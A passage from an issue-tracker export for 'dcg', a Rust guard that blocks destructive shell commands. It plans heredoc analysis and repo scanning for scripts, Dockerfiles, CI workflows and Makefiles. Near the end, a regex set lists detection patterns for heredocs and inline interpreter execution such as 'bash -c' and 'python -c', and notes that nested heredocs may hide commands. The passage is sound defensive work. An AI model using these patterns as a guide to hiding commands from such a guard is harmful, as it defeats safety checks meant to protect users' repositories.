heredocs.len() \u003e= 10 {\n            tracing::warn!(\"too_many_heredocs: stopping at 10\");\n            break;\n        }\n    }\n    \n    heredocs\n}\n```\n\n### 7. Nested Heredocs\n\n```rust\n// Detect heredoc inside heredoc (rare but possible)\nfn detect_nested_heredocs(content: \u0026str) -\u003e bool {\n    HEREDOC_PATTERNS.is_match(content)\n}\n\nfn analyze_heredoc(info: \u0026HeredocInfo) -\u003e Vec\u003cPatternMatch\u003e {\n    let mut matches = match_patterns(\u0026info.content, info.language);\n    \n    // Check for nested heredocs\n    if detect_nested_heredocs(\u0026info.content) {\n        tracing::debug!(\"nested_heredoc_detected\");\n        // Recursively analyze? Or just flag it?\n        matches.push(PatternMatch {\n            pattern_name: \"nested_heredoc\".to_string(),\n            reason: \"Heredoc contains another heredoc which may hide commands\".to_string(),\n            severity: Severity::Warn,\n            ..Default::default()\n        });\n    }\n    \n    matches\n}\n```\n\n## Test Cases\n\n```rust\n#[test]\nfn test_oversized_heredoc() {\n    let large_content = \"x\".repeat(2_000_000);\n    let cmd = format!(\"python3 \u003c\u003c 'EOF'\\n{}\\nEOF\", large_content);\n    assert!(extract_heredoc(\u0026cmd).is_err());\n}\n\n#[test]\nfn test_binary_content() {\n    let cmd = \"cat \u003c\u003c 'EOF'\\n\\x00\\x01\\x02binary\\nEOF\";\n    assert!(extract_heredoc(cmd).is_err());\n}\n\n#[test]\nfn test_multiple_heredocs() {\n    let cmd = \"python3 \u003c\u003c 'A'\\ncode1\\nA\\nbash \u003c\u003c 'B'\\ncode2\\nB\";\n    let heredocs = extract_all_heredocs(cmd);\n    assert_eq!(heredocs.len(), 2);\n}\n```\n\n## Performance Impact\n\nThese checks add minimal overhead:\n- Size check: O(1)\n- Binary check: O(n) but early exit\n- Timeout: Checked periodically, not per-byte","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-rbst","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T19:46:02.228572246-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-rbst","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T19:47:10.592550683-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan","title":"Epic: Repo scanning + integrations (pre-commit/CI)","description":"# Epic: Repo scanning + integrations (pre-commit/CI)\n\n## Why this epic exists\n\nThe hook protects *interactive* command execution, but teams also need protection against destructive commands that get **committed into repositories**:\n\n- CI workflows (`run:` steps) that include dangerous commands\n- Dockerfiles (`RUN`) that include irreversible operations\n- shell scripts and Makefiles that do destructive cleanup\n- Terraform provisioners that run destructive shell\n\nCatching these in review (pre-commit/CI) prevents incidents and makes `dcg` feel like a serious, team-scale safety layer.\n\nCrucially, this must be done **without creating new false positives** that annoy users at org scale.\n\n## Goals\n\n1. Implement `dcg scan` that extracts **executable command contexts** from files and evaluates them using the **same shared evaluator** as hook/CLI.\n2. Provide pre-commit and CI workflows that are \"warn-first\" and configurable (`--fail-on error|warning|none`).\n3. Produce high-quality, actionable output:\n   - stable rule IDs (`pack_id:pattern_name`)\n   - file:line[:col] locations\n   - short reason + optional suggestion\n4. Keep performance bounded:\n   - scan only changed files by default in CI\n   - cap file size and number of findings\n\n## Non-goals (initially)\n\n- Building a full static-analysis engine for arbitrary languages.\n- Grepping entire repos by default.\n\n## Safety constraints\n\n- Scanners must be extractor-based, not naive substring grep.\n- Scanner output must make it obvious what is **executed** vs **documentation**.\n- Default behavior should be conservative (warn-first rollout), with hard-fail only for high-confidence catastrophic rules.\n\n## Acceptance criteria (epic-level)\n\n- `dcg scan --staged` works locally and reports actionable findings.\n- A minimal GitHub Actions workflow can run `dcg scan` on PR diffs and surface results.\n- Unit tests cover extractor correctness for all MVP file types.\n","status":"open","priority":2,"issue_type":"epic","created_at":"2026-01-07T20:47:37.075199813-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:47:37.075199813-05:00"}
{"id":"git_safety_guard-scan.1","title":"Design: dcg scan extraction model + output schema","description":"## Objective\n\nDefine the extraction model, CLI surface area, and output schema for `dcg scan` so implementation is coherent and testable.\n\n## Background\n\nRepo scanning is where false positives can explode:\n\n- YAML contains lots of strings; only some are executed.\n- Dockerfiles have multiple instruction forms; only some invoke a shell.\n- Makefiles have recipes, variables, and docs.\n\nIf we design output + extraction boundaries up front, we can be conservative and predictable.\n\n## Proposed `dcg scan` UX (v1)\n\n### Commands\n\n- `dcg scan --staged`\n- `dcg scan --paths \u003cpath\u003e...`\n- `dcg scan --git-diff \u003crev-range\u003e` (CI/PR default)\n\n### Output\n\n- `--format pretty|json`\n- Findings include:\n  - `file`, `line`, optional `col`\n  - `extractor_id` (e.g., `github-actions.run`, `dockerfile.run`)\n  - `extracted_command` (possibly truncated)\n  - `decision` (allow|warn|deny)\n  - `rule_id` (`pack_id:pattern_name`) when matched\n  - `reason`\n  - optional `suggestion`\n\n### Policy knobs\n\n- `--fail-on error|warning|none` (maps to deny/warn/info)\n- `--max-file-size` (default 1MB)\n- `--max-findings` (default 50)\n- `--exclude` glob patterns\n- `--redact` (redact quoted strings or long args)\n\n## Extraction contract\n\nEach extractor returns a list of `ExtractedCommand`:\n\n- `{ file, line, col?, kind, command, metadata }`\n- `kind` identifies an *execution context* (not a doc string).\n\nThis is intentionally the same philosophy as the execution-context classifier for command lines:\n\n- Be explicit about what is executed.\n- Everything else is data.\n\n## MVP file types (must be covered)\n\n- `.sh` (shell script)\n- `Dockerfile` (`RUN` shell form)\n- GitHub Actions workflow YAML (`steps[].run`)\n- `Makefile` recipe lines\n\n## Acceptance criteria\n\n- Output schema is stable enough to write golden tests.\n- Extractor boundaries are conservative and clearly documented.\n- Design here maps cleanly to a small set of Rust structs/enums.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:48:32.372701532-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:48:32.372701532-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.1","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:55:45.283494893-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.2","title":"Implement dcg scan CLI + file selection","description":"## Objective\n\nImplement the `dcg scan` CLI surface area and file-selection logic.\n\nThis task is about:\n\n- parsing args (`--staged`, `--paths`, `--git-diff`)\n- selecting candidate files safely and predictably\n- calling extractors and aggregating findings\n\nIt is *not* about the detailed extractors themselves (that is a separate task).\n\n## Requirements\n\n### CLI\n\n- Add a `scan` subcommand with:\n  - `--staged` (scan the git index)\n  - `--paths \u003cpaths...\u003e` (scan explicit paths)\n  - `--git-diff \u003crev-range\u003e` (scan files changed in a diff)\n  - `--format pretty|json`\n  - `--fail-on error|warning|none`\n  - `--max-file-size`, `--max-findings`, `--exclude`, `--redact`\n\n### File selection rules\n\n- `--staged` should use `git diff --cached --name-only` (no content parsing via shell; prefer libgit2/gix later if we want).\n- `--git-diff` should use `git diff --name-only \u003crev-range\u003e`.\n- Paths should be filtered by:\n  - file size cap\n  - ignore common vendor dirs (`target/`, `node_modules/`, etc.) unless explicitly included\n\n### Output\n\n- Pretty format groups findings by file.\n- JSON format is a stable schema suitable for CI.\n\n### Error handling\n\n- Missing git repo / git failure should be a clear error for `--staged`/`--git-diff`.\n- Non-existent paths should be a clear error.\n- If extractor fails on a file, we should report an error finding but **not** crash.\n\n## Acceptance criteria\n\n- Running `dcg scan --paths scripts/e2e_test.sh --format json` produces valid JSON (even if no findings).\n- `dcg scan --staged` runs in a git repo and produces deterministic file order.\n- Unit tests exist for argument parsing and path filtering.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:49:10.881718777-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:49:10.881718777-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.2","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:55:59.364769611-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2","depends_on_id":"git_safety_guard-scan.1","type":"blocks","created_at":"2026-01-07T21:23:26.817595271-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.2.1","title":"scan: CLI args and command surface","description":"## Objective\n\nImplement the `dcg scan` CLI argument parsing and subcommand UX.\n\n## Scope\n\n- `dcg scan --staged`\n- `dcg scan --paths \u003cpaths...\u003e`\n- `dcg scan --git-diff \u003crev-range\u003e`\n- `--format pretty|json`\n- `--fail-on error|warning|none`\n\n## Acceptance criteria\n\n- Help text is clear.\n- Invalid flag combos produce helpful errors (e.g., cannot combine `--staged` and `--paths`).\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:16:03.443226256-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:16:03.443226256-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.2.1","depends_on_id":"git_safety_guard-scan.2","type":"parent-child","created_at":"2026-01-07T21:16:28.383412499-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.2.2","title":"scan: git integration (staged + diff file lists)","description":"## Objective\n\nImplement file list discovery for:\n\n- staged files (`git diff --cached --name-only`)\n- diff ranges (`git diff --name-only \u003crev-range\u003e`)\n\n## Requirements\n\n- Deterministic ordering.\n- Clear errors when not in a git repo.\n- Path filtering and excludes are applied consistently.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:16:08.538495954-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:16:08.538495954-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.2.2","depends_on_id":"git_safety_guard-scan.2","type":"parent-child","created_at":"2026-01-07T21:16:33.475014249-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.2.3","title":"scan: output formatting + fail-on policy","description":"## Objective\n\nImplement output formatting for scan results and the policy for failing (blocking).\n\n## Requirements\n\n- Pretty output groups findings by file.\n- JSON output is stable and includes schema version.\n- `--fail-on` controls exit code:\n  - `none`: always exit 0\n  - `warning`: exit non-zero if any warning or error\n  - `error`: exit non-zero only if any error\n\n## Acceptance criteria\n\n- Exit codes match documented policy.\n- Outputs include rule id and reason when a match exists.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:16:13.636737749-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:16:13.636737749-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.2.3","depends_on_id":"git_safety_guard-scan.2","type":"parent-child","created_at":"2026-01-07T21:16:38.567223462-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.3","depends_on_id":"git_safety_guard-scan.2.1","type":"blocks","created_at":"2026-01-07T21:24:02.730946194-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.3","depends_on_id":"git_safety_guard-scan.2.2","type":"blocks","created_at":"2026-01-07T21:24:07.828229935-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.3","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T21:24:28.214491827-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.3","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T21:24:33.308987176-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.2.4","title":"scan: unit tests for CLI/path selection/output","description":"## Objective\n\nAdd unit tests for scan CLI behavior.\n\n## Tests\n\n- argument validation\n- deterministic file ordering\n- exclude/include behavior\n- output schema keys (JSON)\n- exit code behavior under `--fail-on`\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:16:18.732314405-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:16:18.732314405-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.2.4","depends_on_id":"git_safety_guard-scan.2","type":"parent-child","created_at":"2026-01-07T21:16:43.658703242-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.4","depends_on_id":"git_safety_guard-scan.2.1","type":"blocks","created_at":"2026-01-07T21:24:12.924866928-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.4","depends_on_id":"git_safety_guard-scan.2.2","type":"blocks","created_at":"2026-01-07T21:24:18.01864202-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.4","depends_on_id":"git_safety_guard-scan.2.3","type":"blocks","created_at":"2026-01-07T21:24:23.11472507-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3","title":"Implement MVP extractors (shell, Dockerfile, GitHub Actions, Makefile)","description":"## Objective\n\nImplement the first set of conservative, high-signal extractors for `dcg scan`.\n\n## Guiding principle\n\nOnly extract **executable contexts**. Avoid extracting from fields that are obviously documentation.\n\nThis task should explicitly encode these boundaries so false positives don't explode.\n\n## MVP extractors\n\n### 1) Shell scripts (`*.sh`)\n\n- Extract candidate command lines from scripts.\n- Keep it conservative:\n  - ignore pure comments\n  - ignore blank lines\n  - treat each non-comment line as a candidate command line (we're not interpreting variables)\n- Long term improvement (not required for v1): handle multiline `\\` continuations.\n\n### 2) Dockerfile\n\n- Extract `RUN \u003cshell form\u003e` lines.\n- Ignore JSON-array exec-form `RUN [\"cmd\", ...]` for v1 unless we add a tiny parser.\n- Do NOT scan comments or `LABEL`/`ENV`/`ARG` values.\n\n### 3) GitHub Actions workflow YAML\n\n- Extract only `steps[].run` (string or block scalar).\n- Explicitly ignore:\n  - `name:` fields\n  - `env:` values\n  - `with:` values\n  - docs/comments\n\n### 4) Makefile\n\n- Extract recipe lines (tab-indented).\n- Handle `\\` continuation for adjacent recipe lines.\n- Ignore variable definitions and comments.\n\n## Output requirements\n\nEach extracted command must include:\n\n- `file`, `line`, optional `col`\n- `extractor_id`\n- the extracted command string\n\n## Tests\n\n- Unit tests per extractor with minimal fixtures:\n  - confirm *only* execution contexts are extracted\n  - confirm correct line numbers\n  - regression tests for common tricky cases (YAML block scalars, Makefile continuations)\n\n## Acceptance criteria\n\n- The extractors can be run on representative sample files without panicking.\n- Unit tests demonstrate the extractor boundaries (no docs strings).\n- Extracted commands are deterministic and stable for golden tests.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:49:26.918414721-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:49:26.918414721-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:56:04.621135514-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.3","depends_on_id":"git_safety_guard-scan.1","type":"blocks","created_at":"2026-01-07T21:23:31.911198902-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3.1","title":"scan extractor: shell scripts (.sh)","description":"## Objective\n\nExtract executable command lines from shell scripts conservatively.\n\n## Rules (v1)\n\n- Ignore comments and blank lines.\n- Treat each remaining line as a candidate command line.\n- Do not try to evaluate variables.\n\n## Acceptance criteria\n\n- Extracted commands include accurate line numbers.\n- No panics on unusual Unicode or long lines.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:16:54.946988626-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:16:54.946988626-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3.1","depends_on_id":"git_safety_guard-scan.3","type":"parent-child","created_at":"2026-01-07T21:17:23.667222661-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3.2","title":"scan extractor: Dockerfile RUN (shell form)","description":"## Objective\n\nExtract executable shell commands from Dockerfile `RUN` instructions.\n\n## Rules (v1)\n\n- Extract `RUN \u003cshell form\u003e`.\n- Ignore JSON exec-form `RUN [\"cmd\", ...]` in v1 unless we add a tiny parser.\n- Ignore comments, labels, env, args.\n\n## Acceptance criteria\n\n- Correctly handles `RUN` with line continuations (`\\\\`).\n- Provides correct line number for the start of the RUN command.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:17:00.042137556-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:17:00.042137556-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3.2","depends_on_id":"git_safety_guard-scan.3","type":"parent-child","created_at":"2026-01-07T21:17:28.75720403-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3.3","title":"scan extractor: GitHub Actions steps[].run","description":"## Objective\n\nExtract executable commands from GitHub Actions workflow YAML.\n\n## Rules (v1)\n\n- Extract only `steps[].run` values (string or block scalar).\n- Ignore `name`, `env`, `with`, docs fields.\n\n## Acceptance criteria\n\n- Correctly handles block scalar indentation.\n- Provides accurate line numbers.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:17:05.13809578-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:17:05.13809578-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3.3","depends_on_id":"git_safety_guard-scan.3","type":"parent-child","created_at":"2026-01-07T21:17:33.852553708-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3.4","title":"scan extractor: Makefile recipe lines","description":"## Objective\n\nExtract executable recipe commands from Makefiles.\n\n## Rules (v1)\n\n- Extract tab-indented recipe lines.\n- Handle `\\\\` continuations within a recipe.\n- Ignore variable definitions and comments.\n\n## Acceptance criteria\n\n- Correctly identifies recipe boundaries.\n- Provides accurate line numbers.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:17:10.229383509-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:17:10.229383509-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3.4","depends_on_id":"git_safety_guard-scan.3","type":"parent-child","created_at":"2026-01-07T21:17:38.948184716-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3.5","title":"scan extractors: fixtures + unit tests","description":"## Objective\n\nCreate fixtures and unit tests for all MVP extractors.\n\n## Requirements\n\n- Small fixture files per extractor (checked into tests).\n- Tests assert:\n  - only executable contexts are extracted\n  - line numbers are correct\n  - extraction is deterministic\n\n## Acceptance criteria\n\n- Extractor tests fail if we start extracting documentation strings.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:17:15.323965301-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:17:15.323965301-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3.5","depends_on_id":"git_safety_guard-scan.3","type":"parent-child","created_at":"2026-01-07T21:17:44.040251051-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.3.5","depends_on_id":"git_safety_guard-scan.3.1","type":"blocks","created_at":"2026-01-07T21:24:42.964281253-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.3.5","depends_on_id":"git_safety_guard-scan.3.2","type":"blocks","created_at":"2026-01-07T21:24:48.062306771-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.3.5","depends_on_id":"git_safety_guard-scan.3.3","type":"blocks","created_at":"2026-01-07T21:24:53.158858353-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.3.5","depends_on_id":"git_safety_guard-scan.3.4","type":"blocks","created_at":"2026-01-07T21:24:58.256989309-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.4","title":"Pre-commit integration for dcg scan (staged)","description":"## Objective\n\nMake it easy for a team to adopt `dcg scan` locally by providing a first-class pre-commit integration path.\n\n## Background\n\n\"You should run dcg scan\" is not enough. Adoption happens when:\n\n- installation is one command\n- failures are actionable\n- teams can choose warn-first rollout\n\n## Proposed UX\n\n### The core command\n\n- `dcg scan --staged`\n\n### Installation helpers\n\nPick one (or more) pragmatic options:\n\n1. `dcg install-pre-commit` (writes `.git/hooks/pre-commit`)\n2. `dcg print-pre-commit-config` (prints snippets for popular managers)\n\nWe should not assume any specific manager.\n\n### Configuration\n\n- optionally read `.dcg/hooks.toml` for:\n  - scan globs\n  - excludes\n  - fail-on policy\n  - max sizes\n\n## Safety constraints\n\n- Default policy should be conservative:\n  - `fail_on = error` (high-confidence catastrophic rules)\n  - `warning` findings do not block commits by default\n\n## Tests\n\n- Unit test that the generated `.git/hooks/pre-commit` script is correct (string snapshot is fine).\n- E2E test (shell script) that runs `dcg scan --staged` on a small fixture repo and verifies expected behavior.\n\n## Acceptance criteria\n\n- A user can run one command and have pre-commit scanning enabled.\n- The hook can be installed idempotently.\n- Documentation exists in README or `dcg scan --help` output.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:49:44.718141247-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:49:44.718141247-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.4","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:56:09.84683307-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4","depends_on_id":"git_safety_guard-scan.2","type":"blocks","created_at":"2026-01-07T21:23:37.005140608-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4","depends_on_id":"git_safety_guard-scan.3","type":"blocks","created_at":"2026-01-07T21:23:42.102394302-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.4.1","title":"pre-commit: install/uninstall helper (git hooks)","description":"## Objective\n\nImplement a helper command to install a pre-commit hook that runs `dcg scan --staged`.\n\n## Requirements\n\n- Idempotent install.\n- Clear messaging about bypass (`--no-verify`).\n- Support printing configs for hook managers (optional).\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:17:55.636908818-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:17:55.636908818-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.4.1","depends_on_id":"git_safety_guard-scan.4","type":"parent-child","created_at":"2026-01-07T21:18:19.453653841-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4.1","depends_on_id":"git_safety_guard-scan.2.3","type":"blocks","created_at":"2026-01-07T21:25:10.086282153-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4.1","depends_on_id":"git_safety_guard-scan.3.5","type":"blocks","created_at":"2026-01-07T21:25:15.185035321-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.4.2","title":"pre-commit: .dcg/hooks.toml config parsing","description":"## Objective\n\nSupport a project config file for scan globs/excludes/fail policy.\n\n## Requirements\n\n- Conservative defaults.\n- Validate config and surface warnings.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:18:00.729320573-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:18:00.729320573-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.4.2","depends_on_id":"git_safety_guard-scan.4","type":"parent-child","created_at":"2026-01-07T21:18:24.545211146-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4.2","depends_on_id":"git_safety_guard-scan.2.3","type":"blocks","created_at":"2026-01-07T21:25:20.281979873-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.4.3","title":"pre-commit: E2E fixture repo + detailed logging","description":"## Objective\n\nAdd an end-to-end test that:\n\n- creates a small fixture repo\n- stages files with known findings\n- runs `dcg scan --staged`\n- asserts output summary and exit code\n\nLogging must include per finding:\n\n- file:line\n- extracted command\n- rule id\n- reason\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:18:05.825341465-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:18:05.825341465-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.4.3","depends_on_id":"git_safety_guard-scan.4","type":"parent-child","created_at":"2026-01-07T21:18:29.635035168-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.4.4","title":"pre-commit: docs + recommended rollout","description":"## Objective\n\nDocument how to adopt scan-precommit safely:\n\n- warn-first rollout guidance\n- how to fix findings\n- how to use allowlists\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:18:10.920878487-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:18:10.920878487-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.4.4","depends_on_id":"git_safety_guard-scan.4","type":"parent-child","created_at":"2026-01-07T21:18:34.725455653-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.5","title":"CI integration for dcg scan (PR diff scanning + PR summary)","description":"## Objective\n\nProvide a \"team-wide\" safety net by running `dcg scan` in CI for pull requests.\n\n## Background\n\nLocal hooks are not always installed or are bypassed (`--no-verify`). CI is where:\n\n- the org can enforce safety rules\n- results can be reviewed centrally\n- rollouts can start in warn-only mode (avoid blocking velocity)\n\n## Proposed MVP (GitHub Actions)\n\n### 1) Workflow snippet (no marketplace action yet)\n\n- A documented GitHub Actions workflow that:\n  - checks out full history (diff computation)\n  - builds `dcg` (or downloads release artifact later)\n  - runs `dcg scan --git-diff \u003cbase\u003e...HEAD --format json --fail-on error`\n  - uploads the JSON artifact\n\n### 2) Human-readable PR summary\n\n- Render a concise Markdown summary to the job log (and optionally as a PR comment):\n  - top N findings, grouped by file\n  - per finding: line, extracted command (truncated), rule id, reason, suggestion\n  - totals by severity (error/warn/info)\n\n### 3) Rollout model\n\n- Default recommendation:\n  - start with `--fail-on error` only\n  - treat warnings as advisory for 1-2 weeks\n  - tighten after allowlists are created\n\n## Output requirements\n\n- JSON schema must be stable:\n  - include `file`, `line`, `extractor_id`, `extracted_command`, `decision`, `rule_id`, `reason`, `suggestion?`\n- CI mode should have deterministic ordering.\n\n## Security/privacy\n\n- Provide a `--redact` option (or config) for commands that might contain secrets.\n- CI should avoid printing entire extracted commands if they are very long.\n\n## Acceptance criteria\n\n- `dcg scan --git-diff ...` handles empty diffs cleanly (0 findings, exit 0).\n- A workflow snippet exists in docs or templates and is proven to run in this repo.\n- When errors exist, CI fails with an actionable summary.\n- When warnings exist (and `--fail-on error`), CI passes but prints the warnings clearly.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:56:31.299265569-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:56:31.299265569-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.5","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:56:40.548508411-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5","depends_on_id":"git_safety_guard-scan.2","type":"blocks","created_at":"2026-01-07T21:23:47.19945344-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5","depends_on_id":"git_safety_guard-scan.3","type":"blocks","created_at":"2026-01-07T21:23:52.295002514-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.5.1","title":"CI: workflow template for PR diff scanning","description":"## Objective\n\nProvide a copy/paste GitHub Actions workflow snippet for:\n\n- building (or downloading) `dcg`\n- running `dcg scan --git-diff \u003cbase\u003e...HEAD --format json --fail-on error`\n- uploading artifacts\n\n## Acceptance criteria\n\n- Documented and tested in this repo.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:18:47.608110165-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:18:47.608110165-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.5.1","depends_on_id":"git_safety_guard-scan.5","type":"parent-child","created_at":"2026-01-07T21:19:07.365697932-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.5.2","title":"CI: optional PR comment renderer (top findings)","description":"## Objective\n\nOptionally render a Markdown summary suitable for PR comments.\n\n## Requirements\n\n- Group by file.\n- Show top N findings.\n- Use details/summary blocks to keep comments compact.\n\n## Acceptance criteria\n\n- Renderer output is deterministic and test-covered.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:18:52.707720678-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:18:52.707720678-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.5.2","depends_on_id":"git_safety_guard-scan.5","type":"parent-child","created_at":"2026-01-07T21:19:12.458474915-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.5.3","title":"CI: scan --git-diff integration tests","description":"## Objective\n\nAdd integration tests ensuring `dcg scan --git-diff`:\n\n- returns deterministic results\n- handles empty diffs\n- handles renamed/moved files gracefully\n\n## Logging requirements\n\n- tests should log the diff range and files considered.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:18:57.803468576-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:18:57.803468576-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.5.3","depends_on_id":"git_safety_guard-scan.5","type":"parent-child","created_at":"2026-01-07T21:19:17.551755437-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t1rx","title":"Implement Tier 1 regex heredoc detector with RegexSet","description":"# Tier 1: Fast Regex Heredoc Detection\n\n## Objective\n\nImplement the fast-path heredoc detector using Rust's `regex` crate with RegexSet for multi-pattern matching.\n\n## Why RegexSet?\n\nThe `regex` crate's RegexSet allows matching against multiple patterns simultaneously with:\n- Aho-Corasick algorithm for literal prefixes\n- SIMD acceleration (AVX2, SSE4.2)\n- Single pass through input\n- O(n) guaranteed time complexity\n\n## Patterns to Implement\n\n```rust\nstatic HEREDOC_PATTERNS: LazyLock\u003cRegexSet\u003e = LazyLock::new(|| {\n    RegexSet::new([\n        // Bash heredocs\n        r\"\u003c\u003c-?\\s*['\\\"]?\\w+['\\\"]?\",   // \u003c\u003cEOF, \u003c\u003c'EOF', \u003c\u003c-EOF\n        r\"\u003c\u003c\u003c\",                          // Here-strings\n        \n        // Inline script flags  \n        r\"\\b(python3?|python)\\s+-[ce]\\s\",\n        r\"\\b(ruby|irb)\\s+-e\\s\",\n        r\"\\bperl\\s+-[eE]\\s\",\n        r\"\\bnode\\s+-[ep]\\s\",\n        r\"\\b(sh|bash|zsh|fish)\\s+-c\\s\",\n        \n        // Pipe to interpreter\n        